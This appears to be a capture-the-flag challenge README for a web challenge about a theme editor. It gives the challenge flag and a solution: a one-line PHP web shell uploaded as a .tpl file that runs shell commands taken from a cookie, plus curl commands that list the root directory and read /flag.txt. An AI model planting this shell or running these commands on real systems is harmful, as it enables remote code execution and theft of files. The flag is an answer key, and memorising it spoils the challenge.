- Challenge Name: perfectly normal theme editor
- Challenge Category: Web
- Challenge Difficulty: Easy
- Challenge Flag: `d4rk{e4s1Est_Rc3_0f_y0ur_lYf}c0de`
- Challenge Description: Just what the name says.
- Challenge Files: [files](deliverables/)
- Challenge Author: [d4r5h](https://github.com/DarshBhilwara)
- Challenge Solution: Upload a .tpl file containing a php code that bypasses the blacklist, then access it directly to executeshobwq commands and read `/flag.txt`
 Exploit
```
# 1.) Submit this in a file, say abc.tpl
<?= `{$_COOKIE['x']}` ?>

# 2.) Trigger with a cookie
curl -v -b "x=ls -la /" http://localhost:8080/templates/abc.tpl

# 3.) Read the flag
curl -s -b "x=cat /flag.txt" http://localhost:8080/templates/abc.tpl
```
